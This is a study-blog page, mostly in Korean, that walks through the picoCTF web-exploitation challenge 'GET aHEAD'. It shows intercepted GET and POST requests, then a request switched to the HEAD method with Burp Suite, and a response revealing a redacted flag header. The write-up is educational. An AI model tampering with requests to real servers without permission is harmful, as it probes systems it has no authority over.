---
layout: default
title: Week 1-1 GET aHead
parent: Wargame
grand_parent: Study
nav_order: 1
mathjax: true
mermaid: true
permalink: /docs/wargame/week1-1
---

# Week 1-1 GET aHEAD
{: .no_toc }

<details markdown="block">
  <summary>
	Table of contents
  </summary>
{: .fs-3 .text-delta }
- TOC
{:toc}
</details>

---

> [GET aHEAD](https://play.picoctf.org/practice/challenge/132?category=1&page=1&search=)

<center markdown="block">
![1-1](/assets/wargame/1-1.png)
</center>

## GET aHEAD

- Tags: Category: Web Exploitation

### Description

- Find the flag being held on this server to get ahead of the competition http://mercury.picoctf.net:34561/

### Hint

1. Maybe you have more than 2 choices

2. Check out tools like Burpsuite to modify your requests and look at the responses

## Solving

### 관찰

<center markdown="block">
![main-page](/assets/wargame/main-page.png)

http://mercury.picoctf.net:34561/
</center>

##### 사이트 접속, Choose Red 클릭

- Reponse page

	<center markdown="block">
	![choose-red-response-page](/assets/wargame/main-page.png)

	Reponse page
	</center>

- HTTP request message

	```
	GET /index.php? HTTP/1.1
	Host: mercury.picoctf.net:34561
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Connection: close
	Referer: http://mercury.picoctf.net:34561/
	Upgrade-Insecure-Requests: 1


	```

##### Choose Blue 클릭

- Response page

	<center markdown="block">
	![choose-blue-response-page](/assets/wargame/choose-blue-response-page.png)

	Response page
	</center>

- HTTP request message

	```
	POST /index.php HTTP/1.1
	Host: mercury.picoctf.net:34561
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 0
	Origin: http://mercury.picoctf.net:34561
	Connection: close
	Referer: http://mercury.picoctf.net:34561/index.php?
	Upgrade-Insecure-Requests: 1


	```

### 아이디어

- 표면적으로 보이는 HTTP Method는 GET과 POST 두 가지가 있다.

- 제목 GET aHEAD의 HEAD를 봤을 때 웹서버가 HTTP Method인 HEAD도 허용할 것 같다.

	- hint 1. Maybe you have more than 2 choices

- burpsuite를 이용하여 request의 HTTP method를 HEAD로 변조해서 보내고 response를 보자.

	- hint 2. Check out tools like Burpsuite to modify your requests and look at the responses

##### HTTP Method

- `GET`: 리소스 요청

- `POST`: 리소스 전송

- `HEAD`: 리소스 정보(헤더) 요청

### 실행

- HTTP request message의 HTTP method를 HEAD로 변조한다.

##### link 접속, Choose Red 클릭

- HTTP request message 변조

	```
	HEAD /index.php? HTTP/1.1
	Host: mercury.picoctf.net:34561
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Connection: close
	Referer: http://mercury.picoctf.net:34561/
	Upgrade-Insecure-Requests: 1


	```

- HTTP response message

	```
	HTTP/1.1 200 OK
	flag: picoCTF{...}
	Content-type: text/html; charset=UTF-8


	```

##### Choose Blue 클릭

- HTTP request message 변조

	```
	HEAD /index.php HTTP/1.1
	Host: mercury.picoctf.net:34561
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 0
	Origin: http://mercury.picoctf.net:34561
	Connection: close
	Referer: http://mercury.picoctf.net:34561/index.php?
	Upgrade-Insecure-Requests: 1


	```

- HTTP response message

	```
	HTTP/1.1 200 OK
	flag: picoCTF{...}
	Content-type: text/html; charset=UTF-8


	```
